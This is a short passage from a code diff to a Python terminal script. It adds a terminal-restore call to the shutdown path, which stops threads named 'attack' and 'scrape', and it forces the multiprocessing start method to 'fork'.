         S.attack_stop.set()
         S.scrape_stop.set()
+        restore_tty()
         sys.stdout.write(SHOW_CURSOR + RESET + CLEAR + HOME)
         sys.stdout.flush()
 
 if __name__ == "__main__":
+    mp.set_start_method("fork", force=True)
     main()
